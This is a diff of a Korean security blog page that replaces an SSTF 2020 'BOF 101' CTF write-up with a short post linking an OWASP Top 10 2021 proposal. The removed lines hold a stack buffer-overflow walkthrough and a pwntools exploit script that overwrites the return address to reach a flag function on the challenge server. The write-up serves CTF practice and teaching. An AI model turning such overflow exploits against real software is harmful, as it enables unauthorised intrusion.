@@ -6,7 +6,7 @@
   
     
   
-  <link rel="canonical" href="https://blog.jhyeon.dev/2020/08/18/sstf-200818/"/>
+  <link rel="canonical" href="https://blog.jhyeon.dev/2021/01/20/owasp2021-210120/"/>
   <meta http-equiv='x-dns-prefetch-control' content='on' />
   <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
   <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
@@ -24,9 +24,9 @@
 
   <!-- 页面元数据 -->
   
-  <title>SSTF 2020 BOF 101 Write up - JHYEON BLOG</title>
+  <title>OWASP TOP 10 2021 제안 자료 - JHYEON BLOG</title>
   
-    <meta name="keywords" content="Pwnable,BOF">
+    <meta name="keywords" content="OWASP">
   
 
   
@@ -339,7 +339,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title">
-        SSTF 2020 BOF 101 Write up
+        OWASP TOP 10 2021 제안 자료
       </h1>
       <div class='new-meta-box'>
         
@@ -359,7 +359,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class='new-meta-item category'>
     <a class='notlink'>
       <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
-      <a class="category-link" href="/categories/CTF/">CTF</a>
+      <a class="category-link" href="/categories/Web/">Web</a>
     </a>
   </div>
 
@@ -370,7 +370,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>Date : Aug 18, 2020</p>
+    <p>Date : Jan 20, 2021</p>
   </a>
 </div>
 
@@ -381,7 +381,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="SSTF 2020 BOF 101 Write up" data-path="/2020/08/18/sstf-200818/">
+      <div id="lc-pv" data-title="OWASP TOP 10 2021 제안 자료" data-path="/2021/01/20/owasp2021-210120/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         View
@@ -399,43 +399,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   
   
-  <p>우선 file 명령어와 checksec을 사용해서 바이너리 컴파일 정보와, Memory Mitigation을 확인 해보자.</p>
-<p>사진과 같이 x64 dynamic linked binary임을 알 수 있고, FULL RELRO, NX, PIE가 활성화 되어 있는 것을 알 수 있다.</p>
-<p>IDA로 바이너리 분석을 해보면 main() 함수의 동작 로직은 다음과 같다.</p>
-<p>바이너리가 실행되면 scanf 함수를 통해 사용자에게 입력받는 로직이고, 0xdeadbeef 값을 세팅하고 있어</p>
-<p>BOF를 통해 해당 메모리 영역을 덮어버리면 BOF Detected!! 가 발생한다.</p>
-<p>그럼 시나리오는 다음과 같이 생각해볼 수 있다.</p>
-<p>입력 받는 메모리 공간은 rbp-0x90(144) 만큼을 받고 있으니, 140만큼 써주고 체크 로직을 통과하기 위해 나머지 4byte 값을 0xdeadbeef 로 만들어 준다음,</p>
-<p>RSP를 8byte dummy로 채우고 RET 에서 printflag() 함수로 리턴 시켜준다면 플래그를 획득할 수 있는 구조가 된다.</p>
-<p>32비트 환경에서 컴파일 된 바이너리는 SFP(4byte) + RET(4byte)를 가지지만,</p>
-<p>64비트 환경에서 컴파일 된 바이너리는 RSP(8byte) + RET(6byte)의 값을 가지는 것을 고려해주면 된다.</p>
-<pre><code class="py"> 1 #!/usr/bin/python3
- 2 
- 3 from pwn import *
- 4 
- 5 #p = process(&#39;./bof101&#39;)
- 6 
- 7 p = remote(&#39;bof101.sstf.site&#39;,1337)
- 8 
- 9 e = ELF(&#39;./bof101&#39;)
-10 
-11 p.recvuntil(&#39;addr:&#39;)
-12 
-13 flag_addr = int(p.recv(15),16)
-14 
-15 p.recvline()
-16 
-17 print(hex(flag_addr))
-18 
-19 payload = &quot;A&quot;*140
-20 payload += p32(0xdeadbeef)
-21 payload += &quot;A&quot;*8
-22 payload += p64(flag_addr)
-23 
-24 p.sendlineafter(&#39;: &#39;,payload)
-25 
-26 p.interactive()</code></pre>
-<p><code> SCTF&#123;n0w_U_R_B0F_3xpEr7&#125; </code></p>
+  <p>4년마다 OWASP 에서는 웹 애플리케이션에서 발생한 주요 취약점 리스트(top 10/category) 정보를 주는데,</p>
+<p>올해에도 제안 자료가 있어서 링크를 남겨본다. (공식 정보는 아닙니당)</p>
+<p><a target="_blank" rel="noopener" href="https://lab.wallarm.com/owasp-top-10-2021-proposal-based-on-a-statistical-data/?amp&amp;fbclid=IwAR1oIWYr_bXxragBk1OJEX4WasafYOUbyv-61z5wAKicIa6RwuPlJbxJnrc">https://lab.wallarm.com/owasp-top-10-2021-proposal-based-on-a-statistical-data/?amp&amp;fbclid=IwAR1oIWYr_bXxragBk1OJEX4WasafYOUbyv-61z5wAKicIa6RwuPlJbxJnrc</a></p>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
+<li>Play The Web</li>
+</ul>
 
   
   
@@ -449,7 +418,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
     </section>
     <section class='body'>
-      <div class="vlts-rps"><a class="item" href="/2020/11/21/bob-bisc-201129/" title="BISC CTF 2020(oldschool) write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">BISC CTF 2020(oldschool) write up</span></a><a class="item" href="/2020/09/14/csawctf-200914/" title="CSAW CTF 2020 roppity Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">CSAW CTF 2020 roppity Write up</span></a><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">angstorm ctf 2020 Write up</span></a></div></section></div>
+      <div class="vlts-rps"><a class="item" href="/2020/05/15/function-rce-200515/" title="create_function() RCE 취약점 정리" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">create_function() RCE 취약점 정리</span></a></div></section></div>
       
       
       
@@ -466,7 +435,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>Date : Aug 18, 2020</p>
+    <p>Date : Jan 20, 2021</p>
   </a>
 </div>
 
@@ -475,7 +444,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Pwnable/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Pwnable</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/BOF/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>BOF</p></a></div>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/OWASP/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>OWASP</p></a></div>
 
 
         
@@ -492,21 +461,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2020/09/10/search-algorithm-200910/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>탐색 알고리즘(선형, 이진) 정리</p>
-          <p class='content'>탐색 알고리즘 종류1. 선형 탐색법 (리니어 서치)
-왼쪽부터 순서대로 하나씩 확인해 나가는 방법
-
-(한쪽 끝에서 다른 한쪽 끝으로 나아가는 방법)
-
-탐색 시작 → 결과를 탐색...</p>
-        </a>
       
-      
-        <a class='next' href='/2020/06/27/canvas-install-200627/'>
-          <p class='title'>canvas lms installation<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>OSOS : Ubuntu 16.04 Desktop(http://old-releases.ubuntu.com/releases/16.04.4/)
-Canvas LMS - Open S...</p>
+        <a class='next' href='/2021/01/19/dvwa-review-210119/'>
+          <p class='title'>DVWA 웹 취약점 모의 훈련 도구 리뷰<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>IntroDVWA는 웹 취약점 모의 해킹(훈련) 도구이며 다운로드는 아래 링크에서 가능합니다.
+
+http://www.dvwa.co.uk
+
+해당 포스트에서는 초심자인 easy ...</p>
         </a>
       
     </div>
@@ -541,6 +503,20 @@ Canvas LMS - Open S...</p>
 
 
 
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>TOC</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#References"><span class="toc-number">1.</span> <span class="toc-text">References</span></a></li></ol>
+    </div>
+  </section>
+
 
   
 
@@ -556,7 +532,7 @@ Canvas LMS - Open S...</p>
 <script>
   window.pdata={}
   pdata.ispage=true;
-  pdata.postTitle="SSTF 2020 BOF 101 Write up";
+  pdata.postTitle="OWASP TOP 10 2021 제안 자료";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
